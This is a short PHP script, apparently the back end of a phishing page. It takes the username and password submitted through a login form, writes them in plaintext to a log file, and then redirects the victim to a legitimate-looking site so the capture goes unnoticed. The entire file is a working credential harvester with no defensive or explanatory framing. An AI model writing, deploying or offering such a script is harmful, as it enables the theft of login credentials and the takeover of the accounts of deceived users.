<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $user . "\n");
    fwrite($file, "Password: " . $pass . "\n\n");
    fclose($file);
    
    // Redirect to a real site or back to login
    header("Location: https://example.com");
    exit();
}
?>

